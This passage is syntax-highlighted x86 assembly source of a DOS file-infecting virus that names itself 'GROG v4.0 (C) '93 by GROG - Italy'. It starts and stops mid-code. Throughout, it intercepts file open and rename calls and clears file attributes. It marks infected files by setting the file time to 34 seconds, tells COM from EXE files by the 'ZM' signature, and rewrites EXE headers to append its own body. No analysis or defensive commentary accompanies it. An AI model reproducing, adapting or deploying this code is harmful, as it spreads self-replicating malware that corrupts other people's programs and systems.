         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; BX = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; DS =    "    "   "   "     "     "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; ES =    "    "   "   "     "     "</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">zero_regs</span><span class="sc0">
</span><span class="sc5">prepare_exam</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; ES = extra segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">examine_file</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; File not infectable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_rename</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to test_rename</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">video_effect</span><span class="sc0">
</span><span class="sc5">test_rename</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">5600h</span><span class="sc0">        </span><span class="sc1">; Rename file?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">open_file</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to open_file</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">examine_file</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; File not infectable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">open_file</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to open_file</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">video_effect</span><span class="sc0">
</span><span class="sc5">open_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">set_file_att</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xchg_int13</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_file_</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xchg_int13</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">video_effect</span><span class="sc0">

</span><span class="sc5">open_file_</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Get file attributes, open file, ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">        </span><span class="sc1">; Get file attributes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">open_error</span><span class="sc0">      </span><span class="sc1">; Error? Jump to open_error</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">        </span><span class="sc1">; Open file (read)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">open_error</span><span class="sc0">      </span><span class="sc1">; Error? Jump to open_error</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">        </span><span class="sc1">; Get file's date and time</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00011111b</span><span class="sc0">    </span><span class="sc1">; CL = seconds of file time?</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00010001b</span><span class="sc0">    </span><span class="sc1">; Already infected? (34 seconds)?</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">already_inf</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to already_inf</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tst_filesize</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">set_file_att</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dont_set_att</span><span class="sc0">    </span><span class="sc1">; Don't set file attributes? Jump ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">        </span><span class="sc1">; Set file attributes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
</span><span class="sc5">dont_set_att</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">open_error</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">already_inf</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'&gt;&gt;4/93&lt;&lt;'</span><span class="sc0">

</span><span class="sc5">tst_filesize</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Test filesize</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_pos</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">origin_off</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Store offset of original code of...</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">filesiz_exit</span><span class="sc0">    </span><span class="sc1">; Below? Jump to filesiz_exit</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">com_or_exe</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; EXE executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dont_test</span><span class="sc0">       </span><span class="sc1">; Equal? Jump to dont_test</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Filesize too large?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">filesiz_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to filesiz_exit</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fefeh</span><span class="sc4">-(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">18dh</span><span class="sc4">)*</span><span class="sc2">05h</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">filesiz_exit</span><span class="sc0">    </span><span class="sc1">; Above? Jump to filesiz_exit</span><span class="sc0">
</span><span class="sc5">dont_test</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Load DX from stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">filesiz_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack (DX)</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">set_file_sof</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">;  "     "     "      "       "</span><span class="sc0">

</span><span class="sc5">set_file_pos</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set current file position</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">      </span><span class="sc1">;  "     "     "      "</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GROG v4.0 (C) ''93 by GROG - Italy'</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Infect COM/EXE file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">        </span><span class="sc1">; Set file attributes</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CX = new file attributes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">open_error_</span><span class="sc0">     </span><span class="sc1">; Error? Jump to open_error_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">set_file_att</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">        </span><span class="sc1">; Open file (read/write)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">open_error_</span><span class="sc0">     </span><span class="sc1">; Error? Jump to open_error_</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; Save segments at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Load segments from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">        </span><span class="sc1">; Get file's date and time</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">11100000b</span><span class="sc0">    </span><span class="sc1">; Clear seconds of file time</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00010001b</span><span class="sc0">    </span><span class="sc1">; Set infection mark (34 seconds)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
</span><span class="sc5">open_error_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">read_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">      </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc0">  </span><span class="sc1">; DX = offset of file_buffer</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">com_or_exe</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; COM executable</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_exe</span><span class="sc0">      </span><span class="sc1">; Found EXE signature? Jump to inf...</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_com</span><span class="sc0">
</span><span class="sc5">infect_exe</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">com_or_exe</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">    </span><span class="sc1">; EXE executable</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc0">  </span><span class="sc1">; SI = offset of file_buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">      </span><span class="sc1">; Move eightteen bytes</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">file_header</span><span class="sc0">  </span><span class="sc1">; SI = offset of file_header</span><span class="sc0">
</span><span class="sc5">move_header</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; Move file header</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">move_header</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_pos</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Multiply header size in paragrap...</span><span class="sc0">
         </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; DX = header size</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Subtract header size from filesize</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000001111b</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Calculate number of bytes in la...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">calc_pages_</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to calc_pages_</span><span class="sc0">

         </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Negate AL</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00001111b</span><span class="sc0">    </span><span class="sc1">; AL = number of bytes to write</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes to write</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Add number of bytes actually wri...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Calculate number of bytes in la...?</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">calc_pages</span><span class="sc0">      </span><span class="sc1">; Above or equal? Jump to calc_pages</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Load DX from stack</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Increase DX</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
</span><span class="sc5">calc_pages</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
</span><span class="sc5">calc_pages_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,((</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)+</span><span class="sc2">200h</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">test_pages</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">calc_cs_ip</span><span class="sc0">      </span><span class="sc1">; Below? Jump to calc_cs_ip</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_pages</span><span class="sc0">
</span><span class="sc5">calc_cs_ip</span><span class="sc4">:</span><span class="sc0">
